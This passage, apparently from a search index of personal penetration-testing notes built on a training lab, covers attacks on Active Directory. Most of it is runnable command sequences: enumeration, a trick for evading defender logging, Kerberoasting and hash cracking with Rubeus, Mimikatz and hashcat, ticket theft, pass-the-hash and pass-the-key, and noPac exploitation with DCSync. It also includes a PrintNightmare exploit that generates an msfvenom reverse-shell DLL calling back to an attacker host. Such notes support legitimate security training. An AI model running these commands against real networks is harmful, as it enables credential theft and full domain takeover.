domain (the group Domain Admins is included here by default) net localgroup Administrators Information about a group (admins) net localgroup administrators [username] /add Add user to administrators net share Check current shares net user  /domain Get information about a user within the domain net user /domain List all users of the domain net user %username% Information about the current user net use x: \\computer\\share Mount the share locally net view Get a list of computers net view /all /domain[:domainname] Shares on the domains net view \\computer /ALL List shares of a computer net view /domain List of PCs of the domain"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#net-commands-trick","title":"Net Commands Trick","text":"<p>If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing net1 instead of net will execute the same functions without the potential trigger from the net string.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#dsquery","title":"Dsquery","text":"<pre><code># User Search\nPS &gt; dsquery user\n\n# Computer Search\nPS &gt; dsquery computer\n\n# Wildcard Search\nPS &gt; dsquery * \"CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\n\n# Users With Specific Attributes Set (PASSWD_NOTREQD)\nPS &gt; dsquery * -filter \"(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))\" -attr distinguishedName userAccountControl\n\n# Searching for Domain Controllers\nPS &gt; dsquery * -filter \"(userAccountControl:1.2.840.113556.1.4.803:=8192)\" -limit 5 -attr sAMAccountName\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#kerberoasting","title":"Kerberoasting","text":"<p>Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. This attack targets Service Principal Names (SPN) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running. Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as NT AUTHORITY\\LOCAL SERVICE. Any domain user can request a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary. All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.</p> <p>Domain accounts running services are often local administrators, if not highly privileged domain accounts. Due to the distributed nature of systems, interacting services, and associated data transfers, service accounts may be granted administrator privileges on multiple servers across the enterprise. Many services require elevated privileges on various systems, so service accounts are often added to privileged groups, such as Domain Admins, either directly or via nested membership. Finding SPNs associated with highly privileged accounts in a Windows environment is very common. Retrieving a Kerberos ticket for an account with an SPN does not by itself allow you to execute commands in the context of this account. However, the ticket (TGS-REP) is encrypted with the service account\u2019s NTLM hash, so the cleartext password can potentially be obtained by subjecting it to an offline brute-force attack with a tool such as Hashcat.</p> <p>Service accounts are often configured with weak or reused password to simplify administration, and sometimes the password is the same as the username. If the password for a domain SQL Server service account is cracked, you are likely to find yourself as a local admin on multiple servers, if not Domain Admin. Even if cracking a ticket obtained via a Kerberoasting attack gives a low-privilege user account, we can use it to craft service tickets for the service specified in the SPN. For example, if the SPN is set to MSSQL/SRV01, we can access the MSSQL service as sysadmin, enable the xp_cmdshell extended procedure and gain code execution on the target SQL server.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#linux_2","title":"Linux","text":""},{"location":"zNew/ActiveDirectory/ActiveDirectory/#kerberoasting-performing-the-attack","title":"Kerberoasting - Performing the Attack","text":"<p>Depending on your position in a network, this attack can be performed in multiple ways:</p> <ul> <li>From a non-domain joined Linux host using valid domain user credentials.</li> <li>From a domain-joined Linux host as root after retrieving the keytab file.</li> <li>From a domain-joined Windows host authenticated as a domain user.</li> <li>From a domain-joined Windows host with a shell in the context of a domain account.</li> <li>As SYSTEM on a domain-joined Windows host.</li> <li>From a non-domain joined Windows host using runas /netonly.</li> </ul> <p>Several tools can be utilized to perform the attack:</p> <ul> <li>Impacket\u2019s GetUserSPNs.py [https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py] from a non-domain joined Linux host.</li> <li>A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.</li> <li>From Windows, utilizing tools such as PowerView[https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1], Rubeus[https://github.com/GhostPack/Rubeus], and other PowerShell scripts.</li> </ul> <p>Obtaining a TGS ticket via Kerberoasting does not guarantee you a set of valid credentials, and the ticket must still be cracked offline with a tool such as Hashcat to obtain the cleartext password. TGS tickets take longer to crack than other formats such as NTLM hashes, so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using a standard cracking rig.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#kerberoasting-with-getuserspnspy","title":"Kerberoasting with GetUserSPNs.py","text":"<p><code>A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.</code></p> <p>We can start by just gathering a listing of SPNs in the domain. To do this, we will need a set of valid domain credentials and the IP address of a Domain Controller. We can authenticate to the Domain Controller with a cleartext password, NT password hash, or even a Kerberos ticket. For our purposes, we will use a password. Entering the below command will generate a credential prompt and then a nicely formatted listing of all SPN accounts. From the output below, we can see that several accounts are members of the Domain Admins group. If we can retrieve and crack one of these tickets, it could lead to domain compromise. It is always worth investigating the group membership of all accounts because we may find an account with an easy-to-crack ticket that can help us further our goal of moving laterally/vertically in the target domain.</p> <pre><code># Listing SPN Accounts with GetUserSPNs.py\n$ GetUserSPNs.py -dc-ip &lt;DC_IP&gt; &lt;DOMAIN.FULL&gt;/&lt;USERNAME&gt;\n\n\"\"\"\nWe can now pull all TGS tickets for offline processing using the -request flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or John the Ripper for offline password cracking attempts.\n\"\"\"\n# Requesting all TGS Tickets\n$ GetUserSPNs.py -dc-ip &lt;DC_IP&gt; &lt;DOMAIN.FULL&gt;/&lt;USERNAME&gt; -request\n\n\"\"\"\nWe can also be more targeted and request just the TGS ticket for a specific account. Let's try requesting one for just the sqldev account.\n\"\"\"\n# Requesting a Single TGS ticket\n$ GetUserSPNs.py -dc-ip &lt;DC_IP&gt; &lt;DOMAIN.FULL&gt;/&lt;USERNAME&gt; -request-user &lt;DC_USER&gt;\n\n# Saving the TGS Ticket to an Output File\n$ GetUserSPNs.py -dc-ip &lt;DC_IP&gt; &lt;DOMAIN.FULL&gt;/&lt;USERNAME&gt; -request-user &lt;DC_USER&gt; -outputfile &lt;FILENAME&gt;\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#windows_2","title":"Windows","text":""},{"location":"zNew/ActiveDirectory/ActiveDirectory/#kerberoasting-semi-manual-method","title":"Kerberoasting - Semi Manual method","text":""},{"location":"zNew/ActiveDirectory/ActiveDirectory/#enumerating-spns-with-setspnexe","title":"Enumerating SPNs with setspn.exe","text":"<pre><code>&gt; setspn.exe -Q */*\n</code></pre> <p>Targeting a Single User</p> <pre><code>&gt; Add-Type -AssemblyName System.IdentityModel\n&gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433\"\n</code></pre> <p>Retrieving All Tickets Using setspn.exe</p> <pre><code>PS &gt; setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#extracting-tickets-from-memory-with-mimikatz","title":"Extracting Tickets from Memory with Mimikatz","text":"<pre><code>mimikatz # base64 /out:true\nmimikatz # kerberos::list /export  \n\n</code></pre> <p>Preparing the Base64 Blob for Cracking</p> <pre><code>$ echo \"&lt;base64 blob&gt;\" |  tr -d \\\\n \n</code></pre> <p>Placing the Output into a File as .kirbi</p> <pre><code>$ cat encoded_file | base64 -d &gt; sqldev.kirbi\n</code></pre> <p>Extracting the Kerberos Ticket using kirbi2john.py</p> <pre><code>$ python2.7 kirbi2john.py sqldev.kirbi\n</code></pre> <p>Modifiying crack_file for Hashcat</p> <pre><code>$ sed 's/\\$krb5tgs\\$\\(.*\\):\\(.*\\)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/' crack_file &gt; sqldev_tgs_hashcat\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#using-powerview-to-extract-tgs-tickets-httpsrawgithubusercontentcompowershellmafiapowersploitmasterreconpowerviewps1","title":"Using PowerView to Extract TGS Tickets [https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1]","text":"<pre><code>PS &gt; Import-Module .\\PowerView.ps1\n\n# Get Kerberoastable acconts\nPS &gt; Get-DomainUser * -spn | select samaccountname\n\n# Using PowerView to Target a Specific User\nPS &gt; Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat\n\n# Exporting All Tickets to a CSV File\nPS &gt; Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\ilfreight_tgs.csv -NoTypeInformation\n\n# Viewing the Contents of the .CSV File\nPS &gt; cat .\\ilfreight_tgs.csv\n</code></pre> <p>We can also use Rubeus from GhostPack to perform Kerberoasting even faster and easier. Rubeus provides us with a variety of options for performing Kerberoasting.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#using-rubeus-httpsgithubcomghostpackrubeus","title":"Using Rubeus [https://github.com/GhostPack/Rubeus]","text":"<pre><code>PS &gt; .\\Rubeus.exe\n\n# Using the /stats Flag\nPS &gt; .\\Rubeus.exe kerberoast /stats\n\n\"\"\"\nIf we saw any SPN accounts with their passwords set 5 or more years ago, they could be promising targets as they could have a weak password that was set and never changed when the organization was less mature.\n\"\"\"\n\n# Using the /nowrap Flag\nPS &gt; .\\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap\nPS &gt; .\\Rubeus.exe kerberoast /nowrap\n\n# Exporting to file\nPS &gt; .\\Rubeus.exe kerberoast /outfile:out.txt\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#cracking-the-ticket-offline-with-hashcat","title":"Cracking the Ticket Offline with Hashcat","text":""},{"location":"zNew/ActiveDirectory/ActiveDirectory/#a-note-on-encryption-types","title":"A Note on Encryption Types","text":"<p><code>The below examples on encryption types are not reproducible in the module lab because the target Domain Controller is running Windows Server 2019. More on that later in the section.</code></p> <p>Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. When performing Kerberoasting in most environments, we will retrieve hashes that begin with $krb5tgs$23$, an RC4 (type 23) encrypted ticket. Sometimes we will receive an AES-256 (type 18) encrypted hash or hash that begins with $krb5tgs$18$. While it is possible to crack AES-128 (type 17) and AES-256 (type 18) TGS tickets using Hashcat, it will typically be significantly more time consuming than cracking an RC4 (type 23) encrypted ticket, but still possible especially if a weak password is chosen.</p> <pre><code>PS &gt; .\\Rubeus.exe kerberoast /user:testspn /nowrap\n</code></pre> <pre><code>PS &gt; Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes\n</code></pre> <p>Checking with PowerView, we can see that the msDS-SupportedEncryptionTypes attribute is set to 0. The chart here[https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797] tells us that a decimal value of 0 means that a specific encryption type is not defined and set to the default of RC4_HMAC_MD5.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#cracking-the-ticket-with-hashcat-rockyoutxt","title":"Cracking the Ticket with Hashcat &amp; rockyou.txt","text":"<pre><code>$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt \n</code></pre> <p>If we check this with PowerView, we'll see that the msDS-SupportedEncryptionTypes attribute is set to 24, meaning that AES 128/256 encryption types are the only ones supported.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#running-hashcat","title":"Running Hashcat","text":"<pre><code>$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt \n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#using-the-tgtdeleg-flag","title":"Using the /tgtdeleg Flag","text":"<p>We can use Rubeus with the /tgtdeleg flag to specify that we want only RC4 encryption when requesting a new service ticket. The tool does this by specifying RC4 encryption as the only algorithm we support in the body of the TGS request. This may be a failsafe built-in to Active Directory for backward compatibility. By using this flag, we can request an RC4 (type 23) encrypted ticket that can be cracked much faster.</p> <p><code>Note: This does not work against a Windows Server 2019 Domain Controller, regardless of the domain functional level. It will always return a service ticket encrypted with the highest level of encryption supported by the target account. This being said, if we find ourselves in a domain with Domain Controllers running on Server 2016 or earlier (which is quite common), enabling AES will not partially mitigate Kerberoasting by only returning AES encrypted tickets, which are much more difficult to crack, but rather will allow an attacker to request an RC4 encrypted service ticket. In Windows Server 2019 DCs, enabling AES encryption on an SPN account will result in us receiving an AES-256 (type 18) service ticket, which is substantially more difficult (but not impossible) to crack, especially if a relatively weak dictionary password is in use.</code></p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#vulnerabilities","title":"Vulnerabilities","text":""},{"location":"zNew/ActiveDirectory/ActiveDirectory/#printnightmare","title":"PrintNightmare","text":"<p>PrintNightmare is the nickname given to two vulnerabilities (CVE-2021-34527 and CVE-2021-1675) found in the Print Spooler service that runs on all Windows operating systems. Many exploits have been written based on these vulnerabilities that allow for privilege escalation and remote code execution. Using this vulnerability for local privilege escalation is covered in the Windows Privilege Escalation module, but is also important to practice within the context of Active Directory environments for gaining remote access to a host. Let's practice with one exploit that can allow us to gain a SYSTEM shell session on a Domain Controller running on a Windows Server 2019 host.</p> <p>We can use rpcdump.py to see if Print System Asynchronous Protocol and Print System Remote Protocol are exposed on the target.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#enumerating-for-ms-rprn","title":"Enumerating for MS-RPRN","text":"<pre><code>$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#generating-a-dll-payload","title":"Generating a DLL Payload","text":"<pre><code>$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll &gt; backupscript.dll\n\n$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll\n\nuse exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\n\n$ sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\\\172.16.5.225\\CompData\\backupscript.dll'\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#nopac-samaccountname-spoofing","title":"NoPac (SamAccountName Spoofing)","text":"<p>This exploit path takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller. By default, authenticated users can add up to ten computers to a domain. When doing so, we change the name of the new host to match a Domain Controller's SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC's name instead of the new name. When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller.</p> <p>NoPac [https://github.com/Ridter/noPac] uses many tools in Impacket to communicate with, upload a payload, and issue commands from the attack host to the target DC. Before attempting to use the exploit, we should ensure Impacket is installed and the noPac [] exploit repo is cloned to our attack host if needed. We can use these commands to do so:</p> <p>we can use the scripts in the NoPac directory to check if the system is vulnerable using a scanner (scanner.py) then use the exploit (noPac.py) to gain a shell as NT AUTHORITY/SYSTEM. We can use the scanner with a standard domain user account to attempt to obtain a TGT from the target Domain Controller. If successful, this indicates the system is, in fact, vulnerable. We'll also notice the ms-DS-MachineAccountQuota number is set to 10. In some environments, an astute sysadmin may set the ms-DS-MachineAccountQuota value to 0. If this is the case, the attack will fail because our user will not have the rights to add a new machine account. Setting this to 0 can prevent quite a few AD attacks.</p> <pre><code># Scanning for NoPac\n$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap\n\n# Running NoPac &amp; Getting a Shell\n$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap\n</code></pre> <p>It is important to note that NoPac.py does save the TGT in the directory on the attack host where the exploit was run. We can use ls to confirm.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#using-nopac-to-dcsync-the-built-in-administrator-account","title":"Using noPac to DCSync the Built-in Administrator Account","text":"<pre><code>$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#printer-bug","title":"Printer Bug","text":"<p>The Printer Bug is a flaw in the MS-RPRN protocol (Print System Remote Protocol). This protocol defines the communication of print job processing and print system management between a client and a print server. To leverage this flaw, any domain user can connect to the spool's named pipe with the RpcOpenPrinter method and use the RpcRemoteFindFirstPrinterChangeNotificationEx method, and force the server to authenticate to any host provided by the client over SMB.</p> <p>The spooler service runs as SYSTEM and is installed by default in Windows servers running Desktop Experience. This attack can be leveraged to relay to LDAP and grant your attacker account DCSync privileges to retrieve all password hashes from AD.</p> <p>The attack can also be used to relay LDAP authentication and grant Resource-Based Constrained Delegation (RBCD) privileges for the victim to a computer account under our control, thus giving the attacker privileges to authenticate as any user on the victim's computer. This attack can be leveraged to compromise a Domain Controller in a partner domain/forest, provided you have administrative access to a Domain Controller in the first forest/domain already, and the trust allows TGT delegation, which is not by default anymore.</p> <p>We can use tools such as the Get-SpoolStatus module from this tool or [https://github.com/NotMedic/NetNTLMtoSilverTicket] this tool to check for machines vulnerable to the MS-PRN Printer Bug. This flaw can be used to compromise a host in another forest that has Unconstrained Delegation enabled, such as a domain controller. It can help us to attack across forest trusts once we have compromised one forest.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#privexchange","title":"PrivExchange","text":"<p>The PrivExchange attack results from a flaw in the Exchange Server PushSubscription feature, which allows any domain user with a mailbox to force the Exchange server to authenticate to any host provided by the client over HTTP.</p> <p>The Exchange service runs as SYSTEM and is over-privileged by default (i.e., has WriteDacl privileges on the domain pre-2019 Cumulative Update). This flaw can be leveraged to relay to LDAP and dump the domain NTDS database. If we cannot relay to LDAP, this can be leveraged to relay and authenticate to other hosts within the domain. This attack will take you directly to Domain Admin with any authenticated domain user account.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#password-in-description-field","title":"Password in Description Field","text":"<p>Sensitive information such as account passwords are sometimes found in the user account Description or Notes fields and can be quickly enumerated using PowerView. For large domains, it is helpful to export this data to a CSV file to review offline.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#finding-passwords-in-the-description-field-using-get-domain-user","title":"Finding Passwords in the Description Field using Get-Domain User","text":"<pre><code>PS &gt; Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#passwd_notreqd-field","title":"PASSWD_NOTREQD Field","text":"<p>It is possible to come across domain accounts with the passwd_notreqd field set in the userAccountControl attribute. If this is set, the user is not subject to the current password policy length, meaning they could have a shorter password or no password at all (if empty passwords are allowed in the domain). A password may be set as blank intentionally (sometimes admins don\u2019t want to be called out of hours to reset user passwords) or accidentally hitting enter before entering a password when changing it via the command line. Just because this flag is set on an account, it doesn't mean that no password is set, just that one may not be required. There are many reasons why this flag may be set on a user account, one being that a vendor product set this flag on certain accounts at the time of installation and never removed the flag post-install. It is worth enumerating accounts with this flag set and testing each to see if no password is required (I have seen this a couple of times on assessments). Also, include it in the client report if the goal of the assessment is to be as comprehensive as possible.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#checking-for-passwd_notreqd-setting-using-get-domainuser","title":"Checking for PASSWD_NOTREQD Setting using Get-DomainUser","text":"<pre><code>PS &gt; Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#privilege-escalation","title":"Privilege Escalation","text":"<p>Check Windows Privilege Escalation - Vulnerabilities - Credential Harvesting</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#admin-access-on-machine","title":"Admin Access on Machine","text":"<p>Check Windows Privilege Escalation - Passwords Attacks - Credential Harvesting</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#harvesting-kerberos-tickets-from-windows","title":"Harvesting Kerberos Tickets from Windows","text":"<p>We need a valid Kerberos ticket to perform a Pass the Ticket (PtT). It can be:</p> <pre><code>- `Service Ticket (TGS - Ticket Granting Service) to allow access to a particular resource.`\n- `Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.`\n</code></pre> <p>Before we perform a Pass the Ticket (PtT) attack, let's see some methods to get a ticket using Mimikatz [https://github.com/ParrotSec/mimikatz] and Rubeus [https://github.com/GhostPack/Rubeus].</p> <p>On Windows, tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process. Therefore, to get a ticket from a Windows system, you must communicate with LSASS and request it. As a non-administrative user, you can only get your tickets, but as a local administrator, you can collect everything.</p> <p>We can harvest all tickets from a system using the Mimikatz module sekurlsa::tickets /export. The result is a list of files with the extension .kirbi, which contain the tickets.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#mimikatz-export-tickets","title":"Mimikatz - Export Tickets","text":"<pre><code>&gt; mimikatz.exe\n&gt; privilege::debug\n&gt; sekurlsa::tickets /export\n&gt; exit\n&gt; dir *.kirbi\n</code></pre> <p>The tickets that end with $ correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user's name, followed by an @ that separates the service name and the domain, for example: [randomvalue]-username@service-domain.local.kirbi.</p> <p>Note: If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account.</p> <pre><code>ren \"[0;38319]-2-0-40e10000-tpetty@krbtgt-INLANEFREIGHT.LOCAL.kirbi\" new.kirbi  \n</code></pre> <p>Note: At the time of writing, using Mimikatz version 2.2.0 20220919, if we run \"sekurlsa::ekeys\" it presents all hashes as des_cbc_md4 on some Windows 10 versions. Exported tickets (sekurlsa::tickets /export) do not work correctly due to the wrong encryption. It is possible to use these hashes to generate new tickets or use Rubeus to export tickets in base64 format.`</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#rubeus-export-tickets","title":"Rubeus - Export Tickets","text":"<pre><code>&gt; Rubeus.exe dump /nowrap\n</code></pre> <p>Note: To collect all tickets we need to execute Mimikatz or Rubeus as an administrator.</p> <p>This is a common way to retrieve tickets from a computer. Another advantage of abusing Kerberos tickets is the ability to forge our own tickets. Let's see how we can do this using the OverPass the Hash or Pass the Key technique.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#lateral-movement","title":"Lateral Movement","text":""},{"location":"zNew/ActiveDirectory/ActiveDirectory/#credentials-pass-the-hash","title":"Credentials/ Pass The Hash","text":""},{"location":"zNew/ActiveDirectory/ActiveDirectory/#validating-the-credentials","title":"Validating the Credentials","text":"<p>{ldap,mssql,smb,ssh,winrm}</p> <pre><code>$ crackmapexec &lt;protocol&gt; &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt;\n$ crackmapexec &lt;protocol&gt; &lt;ip_range&gt; -u &lt;user&gt; -H &lt;hash&gt; -d &lt;domain&gt;\n\n$ crackmapexec &lt;protocol&gt; &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt; --local-auth\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#mimikatz","title":"Mimikatz","text":"<pre><code>&gt; kerberos::hash /password:lucky7\n\n&gt; mimikatz.exe\n# privilege::debug \n# sekurlsa::pth /user:&lt;user&gt; /domain:&lt;domain&gt; /ntlm:&lt;hash&gt;\n</code></pre>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#smb","title":"SMB","text":"<p>LateralMovement</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#winrm","title":"WinRM","text":"<p>Enumerating the Remote Management Users Group</p> <pre><code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName \"Remote Management Users\"\n</code></pre> <p>Using the Cypher Query in BloodHound</p> <pre><code>MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]-&gt;(c:Computer) RETURN p2\n</code></pre> <p>WinRM</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#rdp","title":"RDP","text":"<p>Enumerating the Remote Desktop Users Group</p> <pre><code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName \"Remote Desktop Users\"\n</code></pre> <p>Checking the Domain Users Group's Local Admin &amp; Execution Rights using BloodHound If we gain control over a user through an attack such as LLMNR/NBT-NS Response Spoofing or Kerberoasting, we can search for the username in BloodHound to check what type of remote access rights they have either directly or inherited via group membership under Execution Rights on the Node Info tab.</p> <p>We could also check the Analysis tab and run the pre-built queries Find Workstations where Domain Users can RDP or Find Servers where Domain Users can RDP</p> <p>RDP</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#mssql","title":"MSSQL","text":"<p>LateralMovement </p> <p>More often than not, we will encounter SQL servers in the environments we face. It is common to find user and service accounts set up with sysadmin privileges on a given SQL server instance. We may obtain credentials for an account with this access via Kerberoasting (common) or others such as LLMNR/NBT-NS Response Spoofing or password spraying. Another way that you may find SQL server credentials is using the tool Snaffler to find web.config or other types of configuration files that contain SQL server connection strings.</p> <p>BloodHound, once again, is a great bet for finding this type of access via the SQLAdmin edge. We can check for SQL Admin Rights in the Node Info tab for a given user or use this custom Cypher query to search:</p> <p>Using a Custom Cypher Query to Check for SQL Admin Rights in BloodHound</p> <pre><code>MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]-&gt;(c:Computer) RETURN p2\n</code></pre> <p>Enumerating MSSQL Instances with PowerUpSQL</p> <pre><code>Import-Module .\\PowerUpSQL.ps1\nGet-SQLInstanceDomain\n\nGet-SQLQuery -Verbose -Instance \"172.16.5.150,1433\" -username \"inlanefreight\\damundsen\" -password \"SQL1234!\" -query 'Select @@version'\n</code></pre> <p>We could then choose enable_xp_cmdshell to enable the xp_cmdshell stored procedure which allows for one to execute operating system commands via the database if the account in question has the proper access rights.</p> <p>xp_cmdshell </p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#pass-the-key-or-overpass-the-hash","title":"Pass the Key or OverPass the Hash","text":"<ul> <li>https://lisandre.com/archives/14788</li> <li>https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/over-pass-the-hash-pass-the-key</li> <li>https://www.hackingarticles.in/lateral-movement-over-pass-the-hash/</li> <li>https://www.thehacker.recipes/ad/movement/kerberos/ptk</li> </ul> <p>The traditional Pass the Hash (PtH) technique involves reusing an NTLM password hash that doesn't touch Kerberos. The Pass the Key or OverPass the Hash approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full Ticket-Granting-Ticket (TGT). </p> <p>To forge our tickets, we need to have the user's hash; we can use Mimikatz to dump all users Kerberos encryption keys using the module sekurlsa::ekeys. This module will enumerate all key types present for the Kerberos package.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#mimikatz-extract-kerberos-keys","title":"Mimikatz - Extract Kerberos Keys","text":"<pre><code>&gt; mimikatz.exe\n&gt; privilege::debug\n&gt; sekurlsa::ekeys\n</code></pre> <p>Now that we have access to the AES256_HMAC and RC4_HMAC keys, we can perform the OverPass the Hash or Pass the Key attack using Mimikatz and Rubeus.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#mimikatz-pass-the-key-or-overpass-the-hash","title":"Mimikatz - Pass the Key or OverPass the Hash","text":"<pre><code>&gt; mimikatz.exe\n&gt; privilege::debug\n&gt; sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f\n</code></pre> <p>This will create a new cmd.exe window that we can use to request access to any service we want in the context of the target user.</p> <p>To forge a ticket using Rubeus, we can use the module asktgt with the username, domain, and hash which can be /rc4, /aes128, /aes256, or /des. In the following example, we use the aes256 hash from the information we collect using Mimikatz sekurlsa::ekeys.</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#rubeus-pass-the-key-or-overpass-the-hash","title":"Rubeus - Pass the Key or OverPass the Hash","text":"<pre><code>&gt; Rubeus.exe asktgt /domain:inlanefreight.htb /user:john /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /nowrap\n</code></pre> <p>Note: Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.</p> <p>Note: Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use a rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an \"encryption downgrade.\"</p>"},{"location":"zNew/ActiveDirectory/ActiveDirectory/#remotely","title":"Remotely","text":"<p>I wish to execute this attack remotely then use impacket python script gettgt.py which will use a password, hash or aesKey, it will request a TGT and save it as ccache.</p> <pre><code># with an NT hash (overpass-the-hash)\n$ getTGT.py -dc-ip &lt;IP&gt; -hashes ':&lt;NTLM hash&gt;' &lt;DOMAIN&gt;/&lt;USER&gt;\n\n# with an AES (128 or 256 bits) key (pass-the-key)\n$ getTGT.py -dc-ip &lt;IP&gt; -aesKey '&lt;aes Key&gt;' 